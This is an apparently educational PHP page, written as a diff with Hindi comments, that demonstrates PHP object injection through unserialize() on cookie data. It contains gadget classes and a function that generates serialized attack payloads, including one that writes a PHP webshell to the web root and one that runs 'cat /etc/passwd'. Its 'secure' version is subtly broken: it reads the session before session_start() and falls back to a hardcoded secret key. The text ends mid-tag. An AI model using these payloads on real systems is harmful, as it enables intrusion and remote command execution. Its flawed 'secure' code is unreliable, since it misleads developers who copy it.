@@ -1,0 +1,816 @@
+```php
+<?php
+// ============================================================
+// WARNING: यह स्क्रिप्ट केवल शैक्षिक उद्देश्यों के लिए है
+// यह PHP Object Injection vulnerability को demonstrate करती है
+// Production में कभी भी unserialize() को user input के साथ use न करें
+// ============================================================
+
+// ===== VULNERABLE IMPLEMENTATION (क्या नहीं करना चाहिए) =====
+
+class UserPreferences {
+    public $theme = 'light';
+    public $language = 'hi';
+    public $fontSize = 14;
+    public $notifications = true;
+    
+    public function __construct($theme = 'light', $language = 'hi', $fontSize = 14, $notifications = true) {
+        $this->theme = $theme;
+        $this->language = $language;
+        $this->fontSize = $fontSize;
+        $this->notifications = $notifications;
+    }
+    
+    // DANGEROUS: Magic method जो deserialization के समय call होती है
+    public function __wakeup() {
+        // यह method automatically call होती है जब object unserialize होता है
+        echo "<!-- UserPreferences object woke up -->\n";
+    }
+    
+    // DANGEROUS: यह method object destroy होने पर call होती है
+    public function __destruct() {
+        // अगर attacker ने malicious class inject की तो यहाँ arbitrary code execute हो सकता है
+        echo "<!-- Object destroyed -->\n";
+    }
+}
+
+// ===== DANGEROUS GADGET CLASS (Attack scenario) =====
+// यह class दिखाती है कि PHP Object Injection कैसे काम करता है
+
+class FileLogger {
+    public $logFile = '/tmp/app.log';
+    public $logMessage = 'Default log entry';
+    
+    // DANGEROUS: __destruct में file write operation
+    public function __destruct() {
+        // Attacker इसे arbitrary file write के लिए exploit कर सकता है
+        if (!empty($this->logFile) && !empty($this->logMessage)) {
+            // यह line attacker को arbitrary files लिखने देती है
+            file_put_contents($this->logFile, $this->logMessage . "\n", FILE_APPEND);
+        }
+    }
+}
+
+class CommandExecutor {
+    public $command = 'echo safe';
+    
+    // DANGEROUS: __wakeup में command execution
+    public function __wakeup() {
+        // Attacker इसे Remote Code Execution के लिए exploit कर सकता है
+        // system($this->command); // यह line RCE allow करती है
+        echo "<!-- Command would execute: " . htmlspecialchars($this->command) . " -->\n";
+    }
+}
+
+// ===== VULNERABLE COOKIE HANDLER =====
+
+function vulnerableLoadPreferences() {
+    if (isset($_COOKIE['user_prefs'])) {
+        $cookieData = $_COOKIE['user_prefs'];
+        
+        // ❌ VULNERABLE: User-controlled data को directly unserialize करना
+        // Attacker crafted serialized payload inject कर सकता है
+        $prefs = unserialize(base64_decode($cookieData));
+        
+        if ($prefs instanceof UserPreferences) {
+            return $prefs;
+        }
+    }
+    return new UserPreferences();
+}
+
+function vulnerableSavePreferences($prefs) {
+    // ❌ VULNERABLE: Object को serialize करके cookie में store करना
+    $serialized = base64_encode(serialize($prefs));
+    setcookie('user_prefs', $serialized, time() + 86400, '/');
+}
+
+// ===== ATTACK DEMONSTRATION =====
+
+function demonstrateAttack() {
+    echo "<div class='attack-demo'>\n";
+    echo "<h3>⚠️ Attack Payload Examples</h3>\n";
+    
+    // Attack 1: Malicious FileLogger object
+    $maliciousLogger = new FileLogger();
+    $maliciousLogger->logFile = '/var/www/html/shell.php';
+    $maliciousLogger->logMessage = '<?php system($_GET["cmd"]); ?>';
+    
+    $payload1 = base64_encode(serialize($maliciousLogger));
+    echo "<p><strong>Attack 1 - File Write Payload:</strong></p>\n";
+    echo "<code>" . htmlspecialchars($payload1) . "</code>\n";
+    echo "<p>यह payload /var/www/html/shell.php में PHP webshell लिखेगा</p>\n";
+    
+    // Attack 2: Malicious CommandExecutor object
+    $maliciousCmd = new CommandExecutor();
+    $maliciousCmd->command = 'cat /etc/passwd';
+    
+    $payload2 = base64_encode(serialize($maliciousCmd));
+    echo "<p><strong>Attack 2 - Command Execution Payload:</strong></p>\n";
+    echo "<code>" . htmlspecialchars($payload2) . "</code>\n";
+    echo "<p>यह payload system commands execute करेगा</p>\n";
+    
+    // Attack 3: Object injection with property manipulation
+    $manipulatedPrefs = new UserPreferences();
+    $manipulatedPrefs->theme = '../../../etc/passwd'; // Path traversal attempt
+    $manipulatedPrefs->language = '<script>alert("XSS")</script>'; // XSS attempt
+    
+    $payload3 = base64_encode(serialize($manipulatedPrefs));
+    echo "<p><strong>Attack 3 - Property Manipulation Payload:</strong></p>\n";
+    echo "<code>" . htmlspecialchars($payload3) . "</code>\n";
+    echo "<p>यह payload XSS और path traversal inject करेगा</p>\n";
+    
+    echo "</div>\n";
+}
+
+// ===== SECURE IMPLEMENTATION =====
+
+class SecureUserPreferences {
+    private static $allowedThemes = ['light', 'dark', 'blue', 'green'];
+    private static $allowedLanguages = ['hi', 'en', 'mr', 'gu', 'ta'];
+    private static $minFontSize = 10;
+    private static $maxFontSize = 24;
+    
+    public $theme;
+    public $language;
+    public $fontSize;
+    public $notifications;
+    
+    public function __construct($theme = 'light', $language = 'hi', $fontSize = 14, $notifications = true) {
+        $this->theme = $this->validateTheme($theme);
+        $this->language = $this->validateLanguage($language);
+        $this->fontSize = $this->validateFontSize($fontSize);
+        $this->notifications = (bool)$notifications;
+    }
+    
+    private function validateTheme($theme) {
+        return in_array($theme, self::$allowedThemes) ? $theme : 'light';
+    }
+    
+    private function validateLanguage($language) {
+        return in_array($language, self::$allowedLanguages) ? $language : 'hi';
+    }
+    
+    private function validateFontSize($size) {
+        $size = (int)$size;
+        return max(self::$minFontSize, min(self::$maxFontSize, $size));
+    }
+    
+    public function toArray() {
+        return [
+            'theme' => $this->theme,
+            'language' => $this->language,
+            'fontSize' => $this->fontSize,
+            'notifications' => $this->notifications
+        ];
+    }
+    
+    public static function fromArray($data) {
+        return new self(
+            $data['theme'] ?? 'light',
+            $data['language'] ?? 'hi',
+            $data['fontSize'] ?? 14,
+            $data['notifications'] ?? true
+        );
+    }
+}
+
+// ✅ SECURE: JSON का उपयोग serialize() की जगह
+function secureLoadPreferences() {
+    if (isset($_COOKIE['user_prefs_secure'])) {
+        $cookieData = $_COOKIE['user_prefs_secure'];
+        
+        // ✅ SECURE: JSON decode करें
+        $decoded = base64_decode($cookieData, true);
+        if ($decoded === false) {
+            return new SecureUserPreferences();
+        }
+        
+        // HMAC signature verify करें
+        $parts = explode('|', $decoded, 2);
+        if (count($parts) !== 2) {
+            return new SecureUserPreferences();
+        }
+        
+        [$signature, $jsonData] = $parts;
+        $secretKey = getenv('COOKIE_SECRET') ?: 'change-this-secret-key-in-production';
+        $expectedSignature = hash_hmac('sha256', $jsonData, $secretKey);
+        
+        // ✅ SECURE: Timing-safe comparison
+        if (!hash_equals($expectedSignature, $signature)) {
+            error_log("Cookie tampering detected!");
+            return new SecureUserPreferences();
+        }
+        
+        // ✅ SECURE: JSON parse करें (serialize नहीं)
+        $data = json_decode($jsonData, true);
+        if (!is_array($data)) {
+            return new SecureUserPreferences();
+        }
+        
+        return SecureUserPreferences::fromArray($data);
+    }
+    
+    return new SecureUserPreferences();
+}
+
+function secureSavePreferences(SecureUserPreferences $prefs) {
+    $jsonData = json_encode($prefs->toArray());
+    $secretKey = getenv('COOKIE_SECRET') ?: 'change-this-secret-key-in-production';
+    
+    // HMAC signature generate करें
+    $signature = hash_hmac('sha256', $jsonData, $secretKey);
+    $cookieValue = base64_encode($signature . '|' . $jsonData);
+    
+    // ✅ SECURE: HttpOnly, Secure, SameSite flags के साथ cookie set करें
+    setcookie(
+        'user_prefs_secure',
+        $cookieValue,
+        [
+            'expires' => time() + 86400,
+            'path' => '/',
+            'domain' => '',
+            'secure' => true,        // HTTPS only
+            'httponly' => true,      // JavaScript access नहीं
+            'samesite' => 'Strict'   // CSRF protection
+        ]
+    );
+}
+
+// ===== FORM PROCESSING =====
+
+$message = '';
+$messageType = '';
+
+// Secure preferences save करें
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
+    if ($_POST['action'] === 'save_secure') {
+        // CSRF token verify करें
+        if (!isset($_POST['csrf_token']) || !isset($_SESSION['csrf_token']) || 
+            !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
+            $message = "❌ CSRF token invalid!";
+            $messageType = "error";
+        } else {
+            $prefs = new SecureUserPreferences(
+                $_POST['theme'] ?? 'light',
+                $_POST['language'] ?? 'hi',
+                $_POST['fontSize'] ?? 14,
+                isset($_POST['notifications'])
+            );
+            secureSavePreferences($prefs);
+            $message = "✅ Preferences सुरक्षित रूप से save हो गई!";
+            $messageType = "success";
+        }
+    }
+}
+
+// Session और CSRF token
+session_start();
+if (!isset($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
+// Current preferences load करें
+$currentPrefs = secureLoadPreferences();
+
+?>
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP Object Injection - Security Demo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 20px;
+            border-bottom: 2px solid #e74c3c;
+            text-align: center;
+        }
+        
+        .header h1 {
+            color: #e74c3c;
+            font-size: 1.8em;
+        }
+        
+        .header p {
+            color: #aaa;
+            margin-top: 5px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .grid { grid-template-columns: 1fr; }
+        }
+        
+        .card {
+            background: #1a1a2e;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #333;
+        }
+        
+        .card.vulnerable {
+            border-color: #e74c3c;
+        }
+        
+        .card.secure {
+            border-color: #2ecc71;
+        }
+        
+        .card.info {
+            border-color: #3498db;
+        }
+        
+        .card h2 {
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+        
+        .card.vulnerable h2 { color: #e74c3c; }
+        .card.secure h2 { color: #2ecc71; }
+        .card.info h2 { color: #3498db; }
+        
+        .badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.75em;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .badge.danger { background: #e74c3c; color: white; }
+        .badge.safe { background: #2ecc71; color: white; }
+        
+        .code-block {
+            background: #0d0d0d;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        
+        .code-block .comment { color: #6a9955; }
+        .code-block .keyword { color: #569cd6; }
+        .code-block .string { color: #ce9178; }
+        .code-block .function { color: #dcdcaa; }
+        .code-block .danger-line { 
+            background: rgba(231, 76, 60, 0.2); 
+            display: block;
+            margin: 0 -15px;
+            padding: 0 15px;
+        }
+        .code-block .safe-line { 
+            background: rgba(46, 204, 113, 0.2); 
+            display: block;
+            margin: 0 -15px;
+            padding: 0 15px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #aaa;
+            font-size: 0.9em;
+        }
+        
+        .form-group select,
+        .form-group input[type="number"] {
+            width: 100%;
+            padding: 8px 12px;
+            background: #0d0d0d;
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: #e0e0e0;
+            font-size: 0.9em;
+        }
+        
+        .form-group select:focus,
+        .form-group input:focus {
+            outline: none;
+            border-color: #2ecc71;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+        
+        .btn-success {
+            background: #2ecc71;
+            color: #1a1a2e;
+        }
+        
+        .btn:hover {
+            opacity: 0.8;
+            transform: translateY(-1px);
+        }
+        
+        .alert {
+            padding: 12px 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 0.9em;
+        }
+        
+        .alert-danger {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid #e74c3c;
+            color: #e74c3c;
+        }
+        
+        .alert-success {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid #2ecc71;
+            color: #2ecc71;
+        }
+        
+        .alert-warning {
+            background: rgba(241, 196, 15, 0.2);
+            border: 1px solid #f1c40f;
+            color: #f1c40f;
+        }
+        
+        .vulnerability-list {
+            list-style: none;
+        }
+        
+        .vulnerability-list li {
+            padding: 8px 0;
+            border-bottom: 1px solid #333;
+            font-size: 0.9em;
+        }
+        
+        .vulnerability-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .vulnerability-list li::before {
+            content: '⚠️ ';
+        }
+        
+        .secure-list {
+            list-style: none;
+        }
+        
+        .secure-list li {
+            padding: 8px 0;
+            border-bottom: 1px solid #333;
+            font-size: 0.9em;
+        }
+        
+        .secure-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .secure-list li::before {
+            content: '✅ ';
+        }
+        
+        .prefs-display {
+            background: #0d0d0d;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        
+        .prefs-display .pref-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            border-bottom: 1px solid #222;
+            font-size: 0.9em;
+        }
+        
+        .prefs-display .pref-item:last-child {
+            border-bottom: none;
+        }
+        
+        .pref-key { color: #aaa; }
+        .pref-value { color: #2ecc71; font-weight: bold; }
+        
+        .full-width {
+            grid-column: 1 / -1;
+        }
+        
+        .tab-container {
+            margin-top: 10px;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 10px;
+        }
+        
+        .tab {
+            padding: 8px 15px;
+            background: #0d0d0d;
+            border: 1px solid #333;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.85em;
+            color: #aaa;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            background: #2ecc71;
+            color: #1a1a2e;
+            border-color: #2ecc71;
+            font-weight: bold;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .attack-demo {
+            background: rgba(231, 76, 60, 0.1);
+            border: 1px solid #e74c3c;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        
+        .attack-demo h3 {
+            color: #e74c3c;
+            margin-bottom: 10px;
+        }
+        
+        .attack-demo code {
+            display: block;
+            background: #0d0d0d;
+            padding: 8px;
+            border-radius: 3px;
+            font-size: 0.75em;
+            word-break: break-all;
+            margin: 5px 0;
+            color: #e74c3c;
+        }
+        
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.85em;
+        }
+        
+        .comparison-table th,
+        .comparison-table td {
+            padding: 10px;
+            border: 1px solid #333;
+            text-align: left;
+        }
+        
+        .comparison-table th {
+            background: #0d0d0d;
+            color: #aaa;
+        }
+        
+        .comparison-table .danger-cell {
+            color: #e74c3c;
+        }
+        
+        .comparison-table .safe-cell {
+            color: #2ecc71;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #555;
+            font-size: 0.85em;
+            border-top: 1px solid #333;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>🔐 PHP Object Injection - Security Demo</h1>
+    <p>PHP Deserialization Vulnerability और Secure Implementation का प्रदर्शन</p>
+</div>
+
+<div class="container">
+    
+    <!-- Warning Banner -->
+    <div class="alert alert-warning" style="margin-top: 20px;">
+        ⚠️ <strong>Educational Purpose Only:</strong> यह demo PHP Object Injection vulnerability को समझाने के लिए है। 
+        Production code में कभी भी user-controlled data को unserialize() न करें।
+    </div>
+    
+    <?php if ($message): ?>
+    <div class="alert <?= $messageType === 'success' ? 'alert-success' : 'alert-danger' ?>">
+        <?= htmlspecialchars($message) ?>
+    </div>
+    <?php endif; ?>
+    
+    <div class="grid">
+        
+        <!-- Vulnerable Implementation -->
+        <div class="card vulnerable">
+            <h2>❌ Vulnerable Implementation <span class="badge danger">DANGEROUS</span></h2>
+            
+            <div class="alert alert-danger">
+                यह code PHP Object Injection के लिए vulnerable है!
+            </div>
+            
+            <div class="code-block">
+<span class="comment">// ❌ VULNERABLE CODE</span>
+<span class="keyword">function</span> <span class="function">loadPreferences</span>() {
+    <span class="keyword">if</span> (isset($_COOKIE[<span class="string">'user_prefs'</span>])) {
+        $data = $_COOKIE[<span class="string">'user_prefs'</span>];
+        $decoded = base64_decode($data);
+        
+        <span class="danger-line">// ❌ User input को directly unserialize करना</span>
+        <span class="danger-line">$prefs = <span class="function">unserialize</span>($decoded);</span>
+        
+        <span class="keyword">return</span> $prefs;
+    }
+}
+            </div>
+            
+            <h3 style="color: #e74c3c; margin: 15px 0 10px;">Vulnerabilities:</h3>
+            <ul class="vulnerability-list">
+                <li>PHP Object Injection (CWE-502)</li>
+                <li>Remote Code Execution (RCE)</li>
+                <li>Arbitrary File Write/Read</li>
+                <li>Property Manipulation</li>
+                <li>XSS via unsanitized properties</li>
+                <li>CSRF attacks</li>
+            </ul>
+            
+            <div style="margin-top: 15px;">
+                <h3 style="color: #e74c3c; margin-bottom: 10px;">Attack Payloads:</h3>
+                <?php demonstrateAttack(); ?>
+            </div>
+        </div>
+        
+        <!-- Secure Implementation -->
+        <div class="card secure">
+            <h2>✅ Secure Implementation <span class="badge safe">SAFE</span></h2>
+            
+            <div class="alert alert-success">
+                यह implementation सुरक्षित है और best practices follow करती है।
+            </div>
+            
+            <div class="code-block">
+<span class="comment">// ✅ SECURE CODE</span>
+<span class="keyword">function</span> <span class="function">secureLoadPreferences</span>() {
+    <span class="keyword">if</span> (isset($_COOKIE[<span class="string">'user_prefs_secure'</span>])) {
+        $decoded = base64_decode($_COOKIE[<span class="string">'user_prefs_secure'</span>]);
+        [$signature, $jsonData] = explode(<span class="string">'|'</span>, $decoded, 2);
+        
+        <span class="safe-line">// ✅ HMAC signature verify करें</span>
+        <span class="safe-line">$expected = hash_hmac(<span class="string">'sha256'</span>, $jsonData, $key);</span>
+        <span class="safe-line"><span class="keyword">if</span> (!hash_equals($expected, $signature)) {</span>
+        <span class="safe-line">    <span class="keyword">return new</span> SecureUserPreferences();</span>
+        <span class="safe-line">}</span>
+        
+        <span class="safe-line">// ✅ JSON use करें, serialize नहीं</span>
+        <span class="safe-line">$data = json_decode($jsonData, <span class="keyword">true</span>);</span>
+        <span class="safe-line"><span class="keyword">return</span> SecureUserPreferences::fromArray($data);</span>
+    }
+}
+            </div>
+            
+            <h3 style="color: #2ecc71; margin: 15px 0 10px;">Security Measures:</h3>
+            <ul class="secure-list">
+                <li>JSON का उपयोग serialize() की जगह</li>
+                <li>HMAC-SHA256 signature verification</li>
+                <li>Input validation और whitelist</li>
+                <li>HttpOnly, Secure, SameSite cookie flags</li>
+                <li>CSRF token protection</li>
+                <li>Timing-safe comparison (hash_equals)</li>
+            </ul>
+            
+            <!-- Secure Preferences Form -->
+            <div style="margin-top: 20px;">
+                <h3 style="color: #2ecc71; margin-bottom: 15px;">Preferences Update करें:</h3>
+                
+                <form method="POST">
+                    <input type="hidden" name="action" value="save_secure">
+                    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
+                    
+                    <div class="form-group">
+                        <label>Theme:</label>
+                        <select name="theme">
+                            <?php foreach (['light', 'dark', 'blue', 'green'] as $theme): ?>
+                            <option value="<?= $theme ?>" <?= $currentPrefs->theme === $theme ? 'selected' : '' ?>>
+                                <?= ucfirst($theme) ?>
+                            </option>
+                            <?php endforeach; ?>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Language:</label>
+                        <select name="language">
+                            <?php 
+                            $languages = ['hi' => 'हिंदी', 'en' => 'English', 'mr' => 'मराठी', 'gu' => 'ગુજરાતી', 'ta' => 'தமிழ்'];
+                            foreach ($languages as $code => $name): ?>
+                            <option value="<?= $code ?>" <?= $currentPrefs->language === $code ? 'selected' : '' ?>>
+                                <?= $name ?>
+                            </option>
+                            <?php endforeach; ?>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Font Size (10-24):</label>
+                        <input type="number" name="fontSize" 
+                               value="<?= htmlspecialchars($currentPrefs->fontSize) ?>" 
+                               min="10" max="24">
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="checkbox-group">
+                            <input type="checkbox" name="notifications" id="notifications"
+                                   <?= $currentPrefs->notifications ? 'checked' : '' ?>>
+                            <label for="notifications">Notifications Enable करें</label>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-success">
+                        💾 Securely Save करें
+                    </button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Current Preferences Display -->
+        <div class="card info">
+            <h2>📊 Current Preferences</h2>
+            
+            <div class="prefs-display">
+                <?php foreach ($currentPrefs->toArray() as $key => $value): ?>
+                <div class="pref-item">
+                    <span class="pref-key"><?= htmlspecialchars($key) ?>:</span>
+                    <span class="pref-value">
+                        <?= htmlspecialchars(is_bool($value) ? ($value ? 'true' : 'false') : $value) ?>
+                    </span>
+                </div>
+                <?php endforeach; ?>
+            </div>
+            
+            <h3 style="color: #3498db; margin: 15px 0 10px;">Cookie Information:</h3>
+            <div class="code-block">
+<span class="comment">// Cookie Flags (Secure)</span>
+HttpOnly: <span class="string">true</span>  <span class="comment">// JS access blocked</span>
+Secure: <span class="string">true</span>     <span class="comment">// HTTPS only</span
